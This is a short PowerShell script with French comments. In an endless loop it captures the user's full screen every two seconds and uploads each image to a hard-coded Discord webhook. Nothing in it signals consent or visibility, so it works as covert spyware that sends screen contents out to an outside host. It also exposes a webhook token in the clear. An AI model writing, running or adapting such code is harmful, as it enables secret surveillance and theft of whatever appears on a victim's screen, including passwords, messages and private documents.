# Importer le module nécessaire pour prendre une capture d'écran
Add-Type -AssemblyName System.Windows.Forms

# Créer une fonction pour prendre une capture d'écran et envoyer sur le webhook Discord
function Send-ScreenshotToDiscord {
    param(
        [string]$WebhookURL
    )

    # Prendre une capture d'écran
    $screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $screenshot.Width, $screenshot.Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($screenshot.Location, [System.Drawing.Point]::Empty, $bitmap.Size)
    $graphic.Dispose()

    # Enregistrer la capture d'écran dans un fichier temporaire
    $tempFile = [System.IO.Path]::GetTempFileName() + ".png"
    $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)

    # Créer le message Discord
    $message = "Nouvelle capture d'écran :"
    
    # Envoyer le fichier sur le webhook Discord
    Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType "multipart/form-data" -InFile $tempFile -Body @{ content = $message }

    # Supprimer le fichier temporaire
    Remove-Item $tempFile
}

# Webhook Discord
$webhookURL = "https://canary.discord.com/api/webhooks/1197836681504620604/RHqeR05938f0sw2iyoWSLWg1jFO5WMv2Ek9wzXjS_wgzeMrPXwOOXLkEG9wkcl10aVPU"

# Envoyer une capture d'écran sur le webhook toutes les deux secondes
while($true) {
    Send-ScreenshotToDiscord -WebhookURL $webhookURL
    Start-Sleep -Seconds 2
}
